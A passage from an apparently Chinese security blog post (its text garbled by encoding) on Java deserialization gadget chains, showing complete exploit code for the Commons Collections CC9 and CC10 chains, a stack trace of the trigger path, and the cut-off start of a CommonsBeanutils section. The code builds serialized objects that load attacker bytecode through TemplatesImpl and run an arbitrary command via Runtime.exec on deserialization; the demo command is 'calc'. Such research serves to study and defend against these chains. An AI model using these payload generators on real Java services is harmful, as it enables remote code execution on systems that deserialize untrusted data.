class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections9</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(entry, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CC10"><a href="#CC10" class="headerlink" title="CC10"></a>CC10</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:64)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class="line">at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:116)</span><br><span class="line">at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)</span><br><span class="line">at org.apache.commons.collections4.map.LazyMap.get(LazyMap.java:165)</span><br><span class="line">at org.apache.commons.collections4.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:73)</span><br><span class="line">at org.apache.commons.collections4.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:122)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:338)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:611)</span><br><span class="line">at java.util.HashSet.readObject(HashSet.java:334)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆHashSetâ†’TiedMapEntryâ†’LazyMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆHashSetâ†’TiedMapEntryâ†’LazyMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆHashSetâ†’TiedMapEntryâ†’LazyMapï¼‰"></a>åŸç†åˆ†æï¼ˆHashSetâ†’TiedMapEntryâ†’LazyMapï¼‰</h4><p>åœ¨ CC6 çš„åŸºç¡€ä¸ŠæŠŠ <code>HashMap</code> æ›¿æ¢ä¸º <code>HashSet</code>ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-6"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-6" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections10</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(entry);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections10</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(entry);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h1><p>Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šJavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸º JavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>commons-beanutils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• <code>PropertyUtils.getProperty</code>ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ã€‚ä¾‹å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span 